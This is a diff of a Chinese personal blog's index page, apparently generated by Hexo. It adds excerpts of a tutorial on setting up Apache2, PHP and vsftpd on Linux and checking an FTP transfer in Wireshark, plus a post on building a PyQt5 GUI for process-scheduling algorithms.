-<p>可以看到从第981个包开始，客户端向FTP服务器发起请求，这就是我后来的<strong>下载</strong>操作</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-20.png" alt="2-20"></p>
-<p>我们可以选中Protocol类型为FTP-DATA的数据包，右击-&gt;追踪流-&gt;TCP流，来查看完整的TCP流数据</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-21.png" alt="2-21"></p>
-<p>从本TCP流中可看出，都是服务器向客户端发送数据，并且传输的内容为一张gif图片</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-22.png" alt="2-22"></p>
-<p>可以将这个数据流以原始数据的方式保存下来，并命名为 <strong>wireshark.gif</strong></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-23.png" alt="2-23"></p>
-<p>借助工具 <strong>winhex</strong> 将抓取下来的图片的十六进制与我们原本用来测试的 <strong>FTP_Success.gif</strong> 对比一下，不仅可以用gif图片的格式打开查看，而且内容没有半点差异</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-24.png" alt="2-24"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-25.png" alt="2-25"></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">基础知识点</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/09/03/Linux系统下搭建Web服务器和FTP服务器/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
     <article id="post-CTF比赛—2019XNUCA — ezphpWriteUp" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -2021,6 +1725,293 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/Knlvre.github-io/2019/09/03/CTF比赛—2019XNUCA — ezphpWriteUp/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-Linux系统下搭建Web服务器和FTP服务器" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/Knlvre.github-io/2019/09/03/Linux系统下搭建Web服务器和FTP服务器/">Linux系统下搭建Web服务器和FTP服务器</a>
+    </h1>
+  
+
+        
+        <a href="/Knlvre.github-io/2019/09/03/Linux系统下搭建Web服务器和FTP服务器/" class="archive-article-date">
+  	<time datetime="2019-09-02T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-03</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Web服务器安装与配置"><a href="#Web服务器安装与配置" class="headerlink" title="Web服务器安装与配置"></a>Web服务器安装与配置</h1><h2 id="Apache2和php组件的安装"><a href="#Apache2和php组件的安装" class="headerlink" title="Apache2和php组件的安装"></a>Apache2和php组件的安装</h2><p>使用如下命令来安装Apache2和php的组件</p>
+<p>Ps：如果只安装Apache2，将会导致写的php文件无法被解析</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install apache2</span><br><span class="line">apt-get install php</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/1-1.png" alt="1-1"></p>
+<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">状态：/etc/init.d/apache2 status（service apache2 status）</span><br><span class="line">开启：/etc/init.d/apache2 start（service apache2 start）</span><br><span class="line">关闭：/etc/init.d/apache2 stop（service apache2 stop）</span><br><span class="line">重启：/etc/init.d/apache2 restart（service apache2 restart）</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/1-2.png" alt="1-2"></p>
+<h2 id="网站根目录"><a href="#网站根目录" class="headerlink" title="网站根目录"></a>网站根目录</h2><p>网站根目录位于：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html</span><br></pre></td></tr></table></figure>
+<p>创建文件时，一些文件记得修改文件对应的权限，才能访问</p>
+<h2 id="登录验证"><a href="#登录验证" class="headerlink" title="登录验证"></a>登录验证</h2><p>Apache2带有登录验证的功能，（1） 在<code>/etc</code>目录下创建<code>.Webpasswd</code>文件，设置登陆使用的用户名和密码。该文件为验证使用的储存用户名密码的文件</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/1-3.png" alt="1-3"></p>
+<p>修改<code>/etc/apache2/sites-available/000-default.conf</code>文件，修改内容如下图所示。</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/1-4.png" alt="1-4"></p>
+<p>修改完成后再去访问就会看到弹出身份认证框</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/1-5.png" alt="1-5"></p>
+<h1 id="FTP服务器安装与配置"><a href="#FTP服务器安装与配置" class="headerlink" title="FTP服务器安装与配置"></a>FTP服务器安装与配置</h1><h2 id="vsftpd组件的安装"><a href="#vsftpd组件的安装" class="headerlink" title="vsftpd组件的安装"></a>vsftpd组件的安装</h2><p>使用如下命令来安装Apache2的组件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install vsftpd</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-1.png" alt="2-1"></p>
+<h2 id="命令-1"><a href="#命令-1" class="headerlink" title="命令"></a>命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查看状态：/etc/init.d/vsftpd status</span><br><span class="line">开启：/etc/init.d/vsftpd start</span><br><span class="line">关闭：/etc/init.d/vsftpd stop</span><br><span class="line">重启：/etc/init.d/vsftpd restart</span><br></pre></td></tr></table></figure>
+<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>创建专门用于上传下载的目录（记得设置权限，不然会导致无法创建文件）</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-2.png" alt="2-2"></p>
+<p>创建新用户并设置密码</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-3.png" alt="2-3"></p>
+<p>修改配置文件 <code>etc/vsftp.conf</code> ,在文件头添加如下内容</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-4.png" alt="2-4"></p>
+<p><code>取消</code>掉 <code>write_enable=YES</code> 的注释，使其生效，不然无法写入文件</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-5.png" alt="2-5"></p>
+<p>新建 <code>/etc/allowed_users</code> 文件，添加允许访问的用户，我们在文件中添加我们刚才创建的用户 <code>uftp</code></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-6.png" alt="2-6"></p>
+<p>可以查看 <code>/etc/ftpusers</code> 文件，文件中的列表是禁止访问的用户</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-7.png" alt="2-7"></p>
+<p>重启 <code>vsftpd</code> 服务，并查看状态</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-8.png" alt="2-8"></p>
+<h2 id="安装-ftp-命令"><a href="#安装-ftp-命令" class="headerlink" title="安装 ftp 命令"></a>安装 ftp 命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install ftp</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-01.png" alt="2-01"></p>
+<p>至此，vsftp 服务器就安装完成了，下面简单演示一下如何用命令传输文件</p>
+<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>通过 <code>ftp + IP地址</code> 命令访问FTP服务；输入正确的用户名和密码进入服务；通过 <code>put</code> 命令来上传指定的文件。如图所示，本次实验将提前准备好的位于用户根目录下的 <code>FTP_Success.gif</code> 文件上传，<code>（local-file）</code>选项填写我们要上传的文件及其所处位置，<code>（remote-file）</code>选项填写文件上传后的位置</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-9.png" alt="2-9"></p>
+<p>通过 <code>netstat -atunp | grep ftp</code> 命令来查看ftp服务使用的端口号</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-10.png" alt="2-10"></p>
+<p>在我们的客户端（也就是我的Windows 10物理机），利用 <code>LeapFTP</code> 软件来连接服务器（也就是我的Kali Linux虚拟机）提供的FTP服务。在主界面点击左上角的 <code>FTP</code>-&gt;<code>Quick Connect</code> 来建立新连接</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-11.png" alt="2-11"></p>
+<p>在弹出来的对话框中输入，服务器的IP地址、端口号（默认21）、Username、Password。这里的用户名密码填写我们刚才创建的那个用户（既 <strong>uftp</strong> 这个用户）</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-12.png" alt="2-12"></p>
+<p>确定后，等待一段时间，就可以在主界面的右侧看到成功连接，并且文件夹里有我们刚才上传的文件：<strong>FTP_Success.gif。</strong></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-13.png" alt="2-13"></p>
+<p>可以右击我们想要下载的目标文件，点击 <strong>Download</strong> 来下载。下载目录可以在主界面的左侧选择，如下图，我们成功将 <strong>FTP_Success.gif</strong> 文件下载到了我物理机的桌面上。</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-14.png" alt="2-14"></p>
+<p>前面有提到 <strong>/etc/allowed_users</strong> 文件是允许访问FTP服务器的用户列表，而 <strong>/etc/ftpusers</strong> 是禁止访问FTP服务器的用户列表，现在我们看一下两个列表的名单</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-15.png" alt="2-15"></p>
+<p>可以看到现在允许访问的只有 <strong>uftp</strong> 怎么一个用户，而 root 用户是禁止访问的。现在我们在 <strong>LeapFTP</strong> 上，用 <strong>root</strong> 用户登录验证一下。可以看到，是登录失败的</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-16.png" alt="2-16"></p>
+<p>现在我们将 root 用户添加到允许访问名单中，然后再登录试一下</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-17.png" alt="2-17"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-18.png" alt="2-18"></p>
+<p>可以看到在我们将 roor 用户添加到允许访问名单，并将之在禁止访问名单中去除后，就可以访问 FTP 服务器了，所以证明允许访问和禁止访问的名单还是有生效的。现在我们用 <strong>Wireshark</strong> 抓包来看一下 FTP 协议从建立连接到下载文件的完整过程</p>
+<p>如下图可见TCP的三次握手建立的过程。FTP分为利用TCP和UDP两类，可以看出来我们本次实验使用的是可靠地TCP</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-19.png" alt="2-19"></p>
+<p>可以看到从第981个包开始，客户端向FTP服务器发起请求，这就是我后来的<strong>下载</strong>操作</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-20.png" alt="2-20"></p>
+<p>我们可以选中Protocol类型为FTP-DATA的数据包，右击-&gt;追踪流-&gt;TCP流，来查看完整的TCP流数据</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-21.png" alt="2-21"></p>
+<p>从本TCP流中可看出，都是服务器向客户端发送数据，并且传输的内容为一张gif图片</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-22.png" alt="2-22"></p>
+<p>可以将这个数据流以原始数据的方式保存下来，并命名为 <strong>wireshark.gif</strong></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-23.png" alt="2-23"></p>
+<p>借助工具 <strong>winhex</strong> 将抓取下来的图片的十六进制与我们原本用来测试的 <strong>FTP_Success.gif</strong> 对比一下，不仅可以用gif图片的格式打开查看，而且内容没有半点差异</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-24.png" alt="2-24"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-25.png" alt="2-25"></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">基础知识点</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/Knlvre.github-io/2019/09/03/Linux系统下搭建Web服务器和FTP服务器/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-Python — PyQt5库的初次应用" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/Knlvre.github-io/2019/09/01/Python — PyQt5库的初次应用/">Python — PyQt5库的初次应用</a>
+    </h1>
+  
+
+        
+        <a href="/Knlvre.github-io/2019/09/01/Python — PyQt5库的初次应用/" class="archive-article-date">
+  	<time datetime="2019-08-31T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-01</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文章对大三下学期的一门课程设计做一个简单的记录</p>
+<p>写了4个进程调度算法，并利用Python3的PyQt5库设计了GUI，代码量大概为1000行</p>
+<p>第一次接触GUI，现学现卖，没有做任何优化</p>
+<h1 id="一、Python-3-7环境下安装PyQt5"><a href="#一、Python-3-7环境下安装PyQt5" class="headerlink" title="一、Python 3.7环境下安装PyQt5"></a>一、Python 3.7环境下安装PyQt5</h1><p>2.安装PyQt5</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install PyQt5</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/PyQt5/1-1.png" alt="1-1"></p>
+<p>2.安装 sip</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip  install sip</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/PyQt5/1-2.png" alt></p>
+<p>3.安装PyQt5-tools</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install PyQt5-tools</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/PyQt5/1-3.png" alt></p>
+<p>安装成功之后就可以在路径下看到<code>pyqt5_tools</code>文件夹（我的是：<code>Python37\Lib\site-packages\pyqt5_tools</code>）</p>
+<p>双击文件夹内的<code>designer.exe</code>就可以打开<code>QT Designer</code>应用</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/PyQt5/1-4.png" alt></p>
+<p>如果可以打开，此时就算安装成功了</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/PyQt5/1-5.png" alt></p>
+<h1 id="二、利用PyQt5编写GUI"><a href="#二、利用PyQt5编写GUI" class="headerlink" title="二、利用PyQt5编写GUI"></a>二、利用PyQt5编写GUI</h1><p>（1）利用QT Designer应用设计</p>
+<p>在QT Designer应用中，可以选择创建窗口的类型（如：Main Window、Dialog、Widget等）</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/PyQt5/2-1.png" alt="2-1"></p>
+<p>选择完窗口类型过后，可以通过左边的工具栏添加各种按钮、文本框、表格等，并且通过右边的工具栏调整位置、大小等</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/PyQt5/2-2.png" alt="2-2"></p>
+<p>点击保存后，会生成一个.ui的文件，以xml格式记录内容，这个文件是无法直接调用的</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/PyQt5/2-3.png" alt="2-3"></p>
+<p>通过如下命令，将保存下来的<code>ui文件</code>转换为<code>py文件</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyuic5 -o [name].py [name].ui</span><br></pre></td></tr></table></figure>
+<p>通过在这个py文件添加如下图的代码，就可以直接运行。</p>
+<p>MainWindow类型：</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/PyQt5/2-5.png" alt="2-5"></p>
+<p>QDialog类型：</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/PyQt5/2-6.png" alt="2-6"></p>
+<p>添加之后直接编译运行该Python文件就可以看到我们设计的窗口了</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/PyQt5/2-7.png" alt="2-7"></p>
+<p>（2）手动编写代码</p>
+<p>原本的ui格式的文件是以xml标签的形式存储，我们是无法直接在Python代码中使用的。上一种方式讲到可以将ui文件转化为py文件，其内部的代码也可以转换为Python语句，添加代码就可以运行，可以直接添加、改写生成的py文件内的代码，就可以改变窗口的内容。</p>
+<p>如：给窗口添加线条</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/PyQt5/2-8.png" alt="2-8"></p>
+<p>如：给窗口添加按钮</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/PyQt5/2-9.png" alt="2-9"></p>
+<h1 id="三、四种调度算法核心代码"><a href="#三、四种调度算法核心代码" class="headerlink" title="三、四种调度算法核心代码"></a>三、四种调度算法核心代码</h1><p>下面直接展示简单完成的调度算法的代码（代码只追求完成任务，没有任何优化嘻嘻）</p>
+<p>1.先来先服务调度算法</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/PyQt5/3-1.png" alt="3-1"></p>
+<p>2.最短作业优先调度算法</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/PyQt5/3-2.png" alt="3-2"></p>
+<p>3.最高响应比优先调度算法</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/PyQt5/3-3.png" alt="3-3"></p>
+<p>4.时间片轮转算法</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/PyQt5/3-4.png" alt="3-4"></p>
